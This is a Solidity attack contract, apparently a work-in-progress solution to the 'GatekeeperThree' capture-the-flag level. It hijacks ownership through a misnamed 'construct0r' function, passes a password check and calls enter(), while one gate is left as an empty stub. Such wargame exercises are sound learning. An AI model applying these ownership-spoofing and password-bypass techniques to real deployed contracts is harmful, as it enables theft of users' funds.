//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../instances/Ilevel28.sol";

contract AttackGateThree {
    GatekeeperThree level28 =
        GatekeeperThree(payable(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9));

    SimpleTrick level28_trick =
        SimpleTrick(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9);

    /**
     * @dev Verify in scipt after execution
     */
    function passGateOne() external {
        level28.construct0r();
    }

    /**
     * @dev to pass gate 2 we need to call the following functions
     */
    function passGateTwo(uint256 _password) external {
        level28.createTrick();

        //need to know SimpleTrick contract target and trick values

        //call checkPassword first: pass password 1676644032
        level28.trick().checkPassword(_password);

        //call tricky trick:
        level28.trick().trickyTrick();
    }

    /**
     * @dev Do the following
     * 1. send 0.0011 eth to GateKeeperContract
     * 2. attemp to send 0.001 ether to owner
     */
    function passGateThree() external {}

    /**
     * @dev call attack after adjustments to pass all the gates
     */
    function attack() external returns (bool) {
        //call construct0r - pass gate 1
        //level28.construct0r();

        //pass gate 2:
        //we can either use trickyTrick or use vm load por etherscan
        //level28.createTrick();

        //trick target
        //level28_trick.target();

        //trick trick(address) will this print?
        //level28.trick();

        //call enter
        return level28.enter();
    }

    receive() external payable {
        require(msg.value >= 0.002 ether);
    }

    fallback() external payable {
        require(msg.value >= 0.002 ether);
    }
}
